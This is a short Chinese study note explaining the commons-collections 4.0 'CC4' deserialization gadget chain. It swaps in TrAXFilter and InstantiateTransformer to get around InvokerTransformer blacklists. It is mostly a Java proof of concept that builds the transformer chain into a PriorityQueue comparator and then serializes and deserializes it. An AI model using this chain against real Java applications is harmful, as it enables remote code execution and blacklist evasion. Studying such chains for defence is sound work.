- [CC4](#cc4)
  - [修改CC2](#修改cc2)
# CC4
条件:   
* commons-collections = 4.0

CC4链主要是对CC2链的变形,用来绕过含有`InvokerTransformer`类的黑名单,使用`TrAXFilter`和`InstantiateTransformer`两个类来代替`InvokerTransformer`类.
## 修改CC2
`TrAXFilter`和`InstantiateTransformer`两个类的原理见CC3,直接在CC2的基础上进行修改即可.
```java
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[] {getTemplate()})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(2);
        Field comparator = queue.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(queue, transformingComparator);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }
```
